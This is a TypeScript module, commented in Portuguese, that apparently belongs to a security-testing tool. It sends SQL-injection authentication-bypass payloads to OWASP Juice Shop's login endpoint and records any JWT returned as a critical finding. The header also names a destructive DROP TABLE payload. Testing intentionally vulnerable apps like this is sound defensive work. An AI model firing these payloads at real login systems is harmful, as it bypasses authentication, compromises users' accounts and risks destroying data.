/**
 * executor/tasks/AbuseSQLInjection.ts
 * ---------------------------------------------------------------
 * Abuse Case: SQL Injection via Endpoint de Login
 *
 * Testa o endpoint de autenticação REST do Juice Shop contra
 * injeção SQL clássica. A aplicação usa SQLite via Sequelize;
 * se a query de login não usar prepared statements, payloads
 * simples podem autenticar qualquer usuário sem senha.
 *
 * Payloads testados:
 *   - admin'--           (comentário SQL clássico)
 *   - ' OR 1=1--         (condição sempre verdadeira)
 *   - '; DROP TABLE --   (destructive — não executado, apenas referenciado)
 *
 * Detecção: se a resposta HTTP 200 retornar um token JWT, a
 * injeção funcionou e o servidor autenticou sem credenciais válidas.
 *
 * Juice Shop Challenge: "Log in with the administrator's user account"
 * Categoria OWASP: A03:2021 – Injection
 * CWE-89: Improper Neutralization of Special Elements used in an SQL Command
 * ---------------------------------------------------------------
 */

import axios from 'axios';
import { Finding } from '../ActionDispatcher';

const SQLI_PAYLOADS = [
  { email: `admin'--`,         password: 'anything', label: "admin'--" },
  { email: `' OR 1=1--`,       password: 'anything', label: "' OR 1=1--" },
  { email: `admin' OR '1'='1`, password: 'anything', label: "admin' OR '1'='1" },
];

export async function abuseSQLInjection(
  _jwt: string,
  baseUrl: string,
): Promise<Finding | null> {
  const successfulPayloads: string[] = [];
  let evidence = '';

  for (const payload of SQLI_PAYLOADS) {
    try {
      const res = await axios.post(
        `${baseUrl}/rest/user/login`,
        { email: payload.email, password: payload.password },
        {
          headers: { 'Content-Type': 'application/json' },
          validateStatus: () => true,
          timeout: 10_000,
        },
      );

      // Login bem-sucedido via SQLi: servidor retorna token JWT
      if (res.status === 200 && res.data?.authentication?.token) {
        successfulPayloads.push(
          `Payload: ${payload.label} → HTTP ${res.status}, token JWT retornado`
        );
        evidence += `Email: ${payload.email}\nToken: ${res.data.authentication.token.substring(0, 60)}...\n\n`;
      }
    } catch {
      // payload gerou erro de rede, continua
    }
  }

  if (successfulPayloads.length === 0) return null;

  return {
    title:       'SQL Injection no Endpoint de Autenticação',
    severity:    'CRITICAL',
    category:    'SQLI_AUTH_BYPASS',
    description:
      'O endpoint de login /rest/user/login é vulnerável a SQL Injection. ' +
      'Payloads simples permitem autenticação sem credenciais válidas, ' +
      'comprometendo a conta de administrador ou qualquer outro usuário.',
    steps: [
      `POST ${baseUrl}/rest/user/login com payloads SQLi`,
      ...successfulPayloads,
    ],
    evidence:     evidence.trim(),
    discoveredAt: new Date(),
  };
}
